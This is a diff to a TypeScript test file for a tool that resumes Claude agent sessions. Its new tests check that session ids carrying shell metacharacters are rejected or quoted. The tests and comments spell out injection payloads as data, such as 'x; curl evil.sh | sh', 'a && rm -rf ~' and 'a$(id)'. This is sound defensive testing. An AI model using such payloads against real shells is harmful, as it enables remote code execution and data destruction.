@@ -7,7 +7,7 @@
  */
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { agentNamesIn, latestAgentName, pickResume, type ResumeCandidate } from '../core/resumeTarget';
+import { agentNamesIn, latestAgentName, pickResume, isSafeSessionId, type ResumeCandidate } from '../core/resumeTarget';
 import { parseRequest, buildResumeCmd, buildSpawnCmd } from '../core/commandBus';
 
 const rec = (name: string, sid = 's1') =>
@@ -28,51 +28,51 @@ test('a renamed session answers to its LAST name, not its first', () => {
 
 test('names match case-insensitively and ignore surrounding space', () => {
   assert.equal(latestAgentName(rec('  AIOS-App  ')), 'aios-app');
-  assert.equal(pickResume('AIOS-APP', [{ sessionId: 'a', mtimeMs: 1, latestName: 'aios-app' }]), 'a');
+  assert.equal(pickResume('AIOS-APP', [{ sessionId: 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222', mtimeMs: 1, latestName: 'aios-app' }]), 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222');
 });
 
 test('pickResume takes the NEWEST session that currently answers to the name', () => {
   const c: ResumeCandidate[] = [
-    { sessionId: 'old', mtimeMs: 100, latestName: 'writer' },
-    { sessionId: 'new', mtimeMs: 900, latestName: 'writer' },
-    { sessionId: 'other', mtimeMs: 999, latestName: 'reviewer' },
+    { sessionId: 'oooo1111-o1o1-4o1o-8o1o-oooo11112222', mtimeMs: 100, latestName: 'writer' },
+    { sessionId: 'nnnn1111-n1n1-4n1n-8n1n-nnnn11112222', mtimeMs: 900, latestName: 'writer' },
+    { sessionId: 'tttt1111-t1t1-4t1t-8t1t-tttt11112222', mtimeMs: 999, latestName: 'reviewer' },
   ];
-  assert.equal(pickResume('writer', c), 'new');
+  assert.equal(pickResume('writer', c), 'nnnn1111-n1n1-4n1n-8n1n-nnnn11112222');
 });
 
 test('a session cannot resume ITSELF', () => {
   // A session filing a resume for its own name would reopen itself — a duplicate at best.
   const c: ResumeCandidate[] = [
-    { sessionId: 'me', mtimeMs: 900, latestName: 'writer' },
-    { sessionId: 'older', mtimeMs: 100, latestName: 'writer' },
+    { sessionId: 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222', mtimeMs: 900, latestName: 'writer' },
+    { sessionId: 'dddd1111-d1d1-4d1d-8d1d-dddd11112222', mtimeMs: 100, latestName: 'writer' },
   ];
-  assert.equal(pickResume('writer', c, 'me'), 'older');
-  assert.equal(pickResume('writer', [c[0]], 'me'), undefined);
+  assert.equal(pickResume('writer', c, 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222'), 'dddd1111-d1d1-4d1d-8d1d-dddd11112222');
+  assert.equal(pickResume('writer', [c[0]], 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222'), undefined);
 });
 
 test('no candidate answers to the name → undefined, never a near miss', () => {
-  const c: ResumeCandidate[] = [{ sessionId: 'a', mtimeMs: 1, latestName: 'writer-2' }];
+  const c: ResumeCandidate[] = [{ sessionId: 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222', mtimeMs: 1, latestName: 'writer-2' }];
   assert.equal(pickResume('writer', c), undefined);
   assert.equal(pickResume('', c), undefined);
 });
 
 test('buildResumeCmd resumes by sessionId and carries no identity flags', () => {
-  const cmd = buildResumeCmd('claude', 'abc-123', { prompt: "pick up where you left off" });
-  assert.match(cmd, /--resume abc-123/);
+  const cmd = buildResumeCmd('claude', 'abc12345-1234-4123-8123-abc123456789', { prompt: "pick up where you left off" });
+  assert.match(cmd, /--resume 'abc12345-1234-4123-8123-abc123456789'/);
   // --name would RE-name the session and --model would re-pin it; a resume inherits both.
   assert.ok(!cmd.includes('--name'), cmd);
   assert.ok(!cmd.includes('--model'), cmd);
 });
 
 test('buildResumeCmd quotes the prompt, and omits it when absent', () => {
-  assert.match(buildResumeCmd('claude', 'x', { prompt: "it's done" }), /'it'\\''s done'/);
-  assert.equal(buildResumeCmd('claude', 'x'), 'claude --resume x');
-  assert.equal(buildResumeCmd('claude', 'x', { prompt: '   ' }), 'claude --resume x');
+  assert.match(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: "it's done" }), /'it'\\''s done'/);
+  assert.equal(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'), "claude --resume 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'");
+  assert.equal(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: '   ' }), "claude --resume 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'");
 });
 
 test('a taskFile replaces the inline prompt for both spawn and resume', () => {
   // Windows PowerShell mangles POSIX-quoted apostrophes, so every prompt spills to a file there.
-  const r = buildResumeCmd('claude', 'x', { prompt: "won't survive", taskFile: '/tmp/t.md' });
+  const r = buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: "won't survive", taskFile: '/tmp/t.md' });
   assert.ok(r.includes('/tmp/t.md'), r);
   assert.ok(!r.includes("won't survive"), r);
   assert.ok(buildSpawnCmd('claude', 'n', { task: "won't", taskFile: '/tmp/t.md' }).includes('/tmp/t.md'));
@@ -182,4 +182,42 @@ test('an unrecognised verb is dead-lettered before any launcher runs', () => {
   const at = body.indexOf("req.action === 'unknown'");
   assert.ok(at > 0 && at < body.indexOf('runSpawn('), 'the unknown-verb refusal must precede every launch');
   assert.match(body.slice(at, at + 400), /markUndelivered/);
+});
+
+test('A SESSION ID IS A FILENAME, NOT A UUID — it never reaches a shell unguarded', () => {
+  /* The id is `path.basename(f, ".jsonl")` for a file in ~/.claude/projects, and it is then
+     interpolated into a command a surface TYPES INTO A LIVE SHELL. "It is a UUID" describes
+     where it usually comes from, not what it is: a file named `x; curl evil.sh | sh .jsonl`
+     dropped in that tree would otherwise turn a resume request into arbitrary execution. The
+     prompt beside it was quoted from the start; the id was not, because nobody questioned it.
+     Worth the rule rather than a patch: this path runs automatically from a BUS request, and the
+     bus exists so agents can drive it — so a local-write primitive becomes a shell primitive. */
+  const real = '7526be1c-68b2-4ac6-b259-1efe4b2f9b02';
+  assert.equal(isSafeSessionId(real), true, 'a real session id must still resume');
+  for (const bad of [
+    'x; curl evil.sh | sh', 'a && rm -rf ~', 'a`id`', 'a$(id)', "a'b", 'a"b', 'a b', 'a|b',
+    'a\nb', 'a>b', 'a&b', '-rf', '--resume', '', 'short',
+  ]) {
+    assert.equal(isSafeSessionId(bad), false, `must refuse: ${JSON.stringify(bad)}`);
+  }
+});
+
+test('an unsafe id is DROPPED from resolution, never sanitised into a different session', () => {
+  /* Sanitising would guess which session a mangled id meant, and resuming the wrong one is the
+     exact substitution this verb exists to prevent. Nothing to resume is the honest answer, and
+     the caller already reports that as a dead letter. */
+  const evil = 'evil; curl x | sh';
+  assert.equal(pickResume('w', [{ sessionId: evil, mtimeMs: 9, latestName: 'w' }]), undefined);
+  // and a safe sibling still wins rather than the whole resolution failing
+  assert.equal(pickResume('w', [
+    { sessionId: evil, mtimeMs: 9, latestName: 'w' },
+    { sessionId: '7526be1c-68b2-4ac6-b259-1efe4b2f9b02', mtimeMs: 1, latestName: 'w' },
+  ]), '7526be1c-68b2-4ac6-b259-1efe4b2f9b02');
+});
+
+test('the built command quotes the id even so — one guard is a policy, two is a boundary', () => {
+  const cmd = buildResumeCmd('claude', '7526be1c-68b2-4ac6-b259-1efe4b2f9b02');
+  assert.match(cmd, /--resume '7526be1c-68b2-4ac6-b259-1efe4b2f9b02'/);
+  // a metacharacter that somehow got through is inert rather than executed
+  assert.doesNotMatch(buildResumeCmd('claude', 'a; rm -rf ~'), /--resume a; rm/);
 });
